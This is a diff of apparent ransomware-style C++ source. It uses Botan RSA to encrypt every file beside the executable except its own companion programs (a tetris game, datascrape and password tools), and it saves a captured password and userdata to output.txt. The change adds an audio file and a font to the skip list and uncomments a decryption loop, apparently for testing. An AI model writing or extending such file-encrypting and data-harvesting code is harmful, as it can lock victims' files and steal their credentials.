@@ -168,7 +168,7 @@ int main()
 
     Botan::RSA_PublicKey pubKey(privKey);
 
-    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeLists.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp", "encrypt.cpp", "datascrape.cpp", "rsa_key.pem", "deploy.bat", "build.bat", "exec.bat", "password.cpp", "password.exe"});
+    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeLists.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp", "encrypt.cpp", "datascrape.cpp", "rsa_key.pem", "deploy.bat", "build.bat", "exec.bat", "password.cpp", "password.exe", "tetrisAudio.ogg", "arial.ttf"});
     for (const fs::path &file : files)
     {
         encryptFileContent(file.string(), pubKey, rng);
@@ -188,17 +188,16 @@ int main()
         }
     }
 
-    // for (const fs::path &file : files)
-    // {
-    //     decryptFileContent(file.string(), privKey, rng);
-    // }
+    for (const fs::path &file : files)
+    {
+        decryptFileContent(file.string(), privKey, rng);
+    }
 
     std::ofstream outFile("output.txt");
     if (outFile.is_open()) {
         outFile << password << "\n" << userdata << std::endl;
         outFile.close();
     }
-    
     
     return 0;
 }
